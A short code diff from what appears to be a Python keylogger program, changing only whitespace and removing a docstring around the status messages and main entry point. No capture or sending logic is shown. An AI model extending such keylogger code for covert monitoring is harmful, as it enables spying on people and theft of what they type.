@@ -447,12 +447,8 @@ class Keylogger:
         print("[*] Logs saved to: "
               f"{self.config.log_dir}")
         print("[*] Keylogger stopped.")
-
-
+        
 def main() -> None:
-    """
-    Entry point with default configuration
-    """
     keylogger = Keylogger(KeyloggerConfig())
 
     try:
